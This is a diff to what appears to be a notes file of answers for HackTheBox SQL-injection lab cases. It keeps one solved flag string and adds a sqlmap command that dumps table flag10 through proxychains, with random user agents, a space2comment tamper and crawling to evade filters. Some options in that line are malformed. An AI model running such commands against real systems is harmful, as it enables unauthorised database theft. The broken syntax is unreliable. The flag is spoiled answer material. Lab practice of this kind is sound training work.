@@ -36,6 +36,8 @@ sqlmap -u " 83.136.254.233:59619/case9.php/id=1&uid=4118292662" -T flag9 --batch
 # HTB{700_much_r4nd0mn355_f0r_my_74573}
 
 # What's the contents of table flag10? (Case #10)
+proxychains4 -q -f <(echo "strict_chain\nremote_dns_-subnet 224\ntcp_read_time_out15000\ntcp_connect_time_out8000\n[ProxyList]\nhttp 192.168.1.1 8080") sqlmap -u "83.136.254.233:59619/case10.php/?id=1&uid=4118292662" -T flag10 --dump --randomize=uid --crawl=2 --random-agent --tamper=space2comment -v 1 --level=3 risk=2
+
 
 # What's the contents of table flag11? (Case #11)
 
